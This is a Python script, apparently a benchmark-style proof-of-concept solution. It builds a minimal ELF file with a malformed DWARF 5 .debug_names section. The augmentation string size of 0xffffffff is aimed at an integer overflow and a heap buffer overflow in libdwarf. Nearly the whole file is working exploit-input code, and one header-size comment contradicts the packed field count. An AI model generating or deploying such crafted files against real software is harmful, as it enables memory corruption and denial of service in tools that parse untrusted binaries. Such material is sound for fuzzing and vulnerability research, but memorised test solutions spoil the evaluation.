import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a PoC ELF file with a malformed .debug_names section
        # aimed at triggering a Heap Buffer Overflow in libdwarf.
        # The vulnerability exploits an integer overflow in the calculation of 
        # the augmentation string padded size and subsequent malloc/memcpy.
        
        # DWARF 5 .debug_names header fields:
        # unit_length (4 bytes) - set to minimal valid size to pass initial checks
        # version (2 bytes) = 5
        # padding (2 bytes) = 0
        # comp_unit_count (4 bytes) = 0
        # local_type_unit_count (4 bytes) = 0
        # foreign_type_unit_count (4 bytes) = 0
        # bucket_count (4 bytes) = 0
        # name_count (4 bytes) = 0
        # abbrev_table_size (4 bytes) = 0
        # augmentation_string_size (4 bytes) = 0xffffffff
        
        # When processing augmentation_string_size:
        # 1. Padded size calculation: (0xffffffff + 3) & ~3 results in 0 (overflow).
        # 2. Validation check: header_size + padded_size <= unit_length passes.
        # 3. Allocation: malloc(0xffffffff + 1) -> malloc(0).
        # 4. Copy: memcpy(dest, src, 0xffffffff) -> Heap Buffer Overflow / Crash.

        # unit_length covers fields after it: 
        # 2(ver) + 2(pad) + 7*4(counts) = 32 bytes.
        # We set it to 0x24 (36) to be safe and satisfy "unit_length >= calculated_size".
        unit_length = 0x24
        version = 5
        padding = 0
        comp_unit_count = 0
        local_type_unit_count = 0
        foreign_type_unit_count = 0
        bucket_count = 0
        name_count = 0
        abbrev_table_size = 0
        aug_string_size = 0xffffffff
        
        # Pack header (Little Endian)
        payload = struct.pack("<IHHIIIIIIII",
            unit_length, version, padding,
            comp_unit_count, local_type_unit_count, foreign_type_unit_count,
            bucket_count, name_count, abbrev_table_size, aug_string_size)
        
        # Append padding to ensure the section is large enough in the file
        # so we don't hit EOF before the vulnerable logic is executed.
        payload += b"\x00" * 128
        
        sections = {
            ".debug_names": payload
        }
        
        return self.build_elf(sections)

    def build_elf(self, sections):
        # Build a minimal valid ELF64 file
        
        # Construct .shstrtab
        shstrtab_content = b"\x00.shstrtab\x00"
        name_offsets = {".shstrtab": 1}
        for name in sections:
            name_offsets[name] = len(shstrtab_content)
            shstrtab_content += name.encode('utf-8') + b"\x00"
            
        offset = 64 # ELF Header size
        data_blobs = []
        
        # Define sections order: .shstrtab, then user sections
        sec_defs = []
        sec_defs.append({
            'name_idx': name_offsets[".shstrtab"],
            'type': 3, # SHT_STRTAB
            'flags': 0,
            'data': shstrtab_content
        })
        
        for name in sections:
            sec_defs.append({
                'name_idx': name_offsets[name],
                'type': 1, # SHT_PROGBITS
                'flags': 0,
                'data': sections[name]
            })
            
        # Layout data blobs
        for sec in sec_defs:
            pad = (4 - (offset % 4)) % 4
            offset += pad
            sec['offset'] = offset
            sec['size'] = len(sec['data'])
            data_blobs.append(b"\x00" * pad + sec['data'])
            offset += sec['size']
            
        # Section Header Table alignment
        pad = (8 - (offset % 8)) % 8
        offset += pad
        shoff = offset
        data_blobs.append(b"\x00" * pad)
        
        # Build Section Headers
        section_headers = []
        # Null Header
        section_headers.append(b"\x00" * 64)
        
        for sec in sec_defs:
            # Elf64_Shdr
            sh = struct.pack("<IIQQQQIIQQ",
                sec['name_idx'], sec['type'], sec['flags'], 0, sec['offset'], sec['size'], 0, 0, 1, 0)
            section_headers.append(sh)
            
        shnum = len(section_headers)
        shstrndx = 1 # .shstrtab is at index 1
        
        # ELF Header (ET_REL, x86_64)
        e_ident = b"\x7fELF\x02\x01\x01\x00" + b"\x00"*8
        ehdr = struct.pack("<16sHHIQQQIHHHHHH",
            e_ident, 1, 62, 1, 0, 0, shoff, 0, 64, 56, 0, 64, shnum, shstrndx)
            
        return ehdr + b"".join(data_blobs) + b"".join(section_headers)